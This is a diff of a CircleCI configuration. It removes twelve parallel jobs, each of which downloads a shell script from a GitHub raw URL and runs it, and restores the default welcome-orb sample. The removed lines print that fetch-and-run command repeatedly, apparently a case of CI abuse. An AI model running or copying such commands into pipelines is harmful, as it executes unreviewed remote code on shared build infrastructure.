@@ -1,103 +1,13 @@
+# Use the latest 2.1 version of CircleCI pipeline process engine. See: https://circleci.com/docs/2.0/configuration-reference
 version: 2.1
-
-jobs:
-  Syifa_12:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_12
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
-  Syifa_11:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_11
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh 
-  Syifa_10:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_10
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
-  Syifa_09:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_09
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
-  Syifa_08:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_08
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
-  Syifa_07:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_07
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
-  Syifa_06:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_06
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
-  Syifa_05:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_05
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
-  Syifa_04:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_04
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
-  Syifa_03:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_03
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
-  Syifa_02:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_02
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
-  Syifa_01:
-    docker:
-      - image: cimg/python:3.8
-    steps:
-      - run:
-          name: Syifa_01
-          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
+# Use a package of configuration called an orb.
+orbs:
+  # Declare a dependency on the welcome-orb
+  welcome: circleci/welcome-orb@0.4.1
+# Orchestrate or schedule a set of jobs
 workflows:
-    version: 2
-    Syifa:
-        jobs:
-            - Syifa_12
-            - Syifa_11
-            - Syifa_10
-            - Syifa_09
-            - Syifa_08
-            - Syifa_07
-            - Syifa_06
-            - Syifa_05
-            - Syifa_04
-            - Syifa_03
-            - Syifa_02
-            - Syifa_01
+  # Name the workflow "welcome"
+  welcome:
+    # Run the welcome/run job in its own container
+    jobs:
+      - welcome/run
